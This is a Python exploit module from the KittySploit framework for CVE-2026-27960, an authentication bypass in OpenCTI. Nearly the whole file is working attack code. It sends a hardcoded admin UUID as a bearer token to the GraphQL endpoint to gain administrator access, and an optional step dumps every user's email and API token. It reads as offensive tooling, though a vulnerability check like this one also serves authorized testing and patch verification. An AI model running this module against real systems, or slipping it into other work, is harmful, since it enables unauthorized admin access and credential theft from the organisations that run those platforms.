#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-27960 — OpenCTI authentication bypass via hardcoded admin UUID."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "OpenCTI Auth Bypass (CVE-2026-27960)",
        "description": (
            "CVE-2026-27960 in OpenCTI 6.6.0 through 6.9.12: authenticateUserByTokenOrUserId "
            "looks up users by bearer token without verifying it equals api_token. The compile-time "
            "admin internal_id 88ec0c6a-13ce-5e39-b486-354fe4a7084f authenticates as admin on "
            "every deployment."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-27960"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-27960",
            "https://www.cve.org/CVERecord?id=CVE-2026-27960",
        ],
        "tags": [
            "opencti",
            "graphql",
            "auth-bypass",
            "unauthenticated",
            "cve-2026-27960",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["opencti", "graphql"],
                "endpoint_pattern_any": ["/graphql"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "hardcoded admin UUID"},
                    {"capability": "admin_access", "from_detail": "GraphQL me query"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(4000, "OpenCTI HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    graphql_path = OptString(
        "/graphql",
        "GraphQL endpoint path (e.g. /graphql, /public/graphql)",
        False,
    )
    dump_users = OptBool(
        False,
        "After bypass, dump all platform users and api_tokens",
        False,
    )

    def check(self):
        base = (self.path or "/").rstrip("/")
        gql = self.graphql_path if self.graphql_path.startswith("/") else f"/{self.graphql_path}"
        endpoint = f"{base}{gql}" if base else gql
        try:
            response = self.http_request(
                method="POST",
                path=endpoint,
                json={
                    "query": (
                        "{ me { id name user_email capabilities { name } "
                        "groups { edges { node { name } } } } }"
                    )
                },
                headers={
                    "Authorization": "Bearer 88ec0c6a-13ce-5e39-b486-354fe4a7084f",
                    "Content-Type": "application/json",
                },
                timeout=int(self.timeout or 15),
            )
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"target unreachable: {exc.__class__.__name__}",
                "confidence": "low",
            }

        if not response:
            return {"vulnerable": False, "reason": "no HTTP response", "confidence": "low"}
        if response.status_code != 200:
            return {
                "vulnerable": False,
                "reason": f"HTTP {response.status_code}",
                "confidence": "high",
            }

        body, err = parse_json_response(response)
        if err or not body:
            return {"vulnerable": False, "reason": err or "invalid JSON", "confidence": "medium"}

        if body.get("errors") and not body.get("data"):
            msgs = [e.get("message", "") for e in body.get("errors") or []]
            joined = "; ".join(msgs)
            for msg in msgs:
                low = msg.lower()
                if "logged in" in low or "identify" in low or "token" in low:
                    return {
                        "vulnerable": False,
                        "reason": f"auth bypass blocked — patched response: {msg}",
                        "confidence": "high",
                    }
            return {
                "vulnerable": False,
                "reason": f"GraphQL error: {joined[:120]}",
                "confidence": "high",
            }

        me = (body.get("data") or {}).get("me")
        if not me:
            return {
                "vulnerable": False,
                "reason": "no 'me' data returned",
                "confidence": "high",
            }

        caps = [c.get("name", "") for c in me.get("capabilities") or []]
        if "BYPASS" not in caps and me.get("id") != "88ec0c6a-13ce-5e39-b486-354fe4a7084f":
            return {
                "vulnerable": False,
                "reason": f"authenticated but not admin (id={me.get('id')}, caps={caps})",
                "confidence": "high",
            }

        return {
            "vulnerable": True,
            "reason": f"Authenticated as admin '{me.get('name', '')}' <{me.get('user_email', '')}>",
            "confidence": "high",
            "me": me,
            "endpoint": endpoint,
        }

    def run(self):
        try:
            print_status("CVE-2026-27960 — OpenCTI authentication bypass")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(result.get("reason", "Target appears vulnerable"))
            me = result.get("me") or {}
            caps = [c.get("name", "") for c in me.get("capabilities") or []]
            groups = [
                edge.get("node", {}).get("name", "")
                for edge in (me.get("groups") or {}).get("edges") or []
            ]
            print_info(f"User ID   : {me.get('id', '')}")
            print_info(f"Groups    : {', '.join(groups) or 'none'}")
            print_info(f"Caps      : {', '.join(caps) or 'none'}")

            if self.dump_users:
                endpoint = result.get("endpoint") or self.graphql_path
                print_status("Dumping platform user accounts")
                try:
                    response = self.http_request(
                        method="POST",
                        path=endpoint,
                        json={
                            "query": "{ users { edges { node { id name user_email api_token } } } }"
                        },
                        headers={
                            "Authorization": "Bearer 88ec0c6a-13ce-5e39-b486-354fe4a7084f",
                            "Content-Type": "application/json",
                        },
                        timeout=int(self.timeout or 15),
                    )
                    body, err = parse_json_response(response)
                    if err or not body:
                        print_warning(err or "user dump returned invalid JSON")
                    else:
                        edges = (body.get("data") or {}).get("users", {}).get("edges") or []
                        for edge in edges:
                            node = edge.get("node") or {}
                            print_info(
                                f"{node.get('name', '?')} <{node.get('user_email', '?')}> "
                                f"token={node.get('api_token', '?')}"
                            )
                except Exception as exc:
                    print_warning(f"User dump failed: {exc.__class__.__name__}")

            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
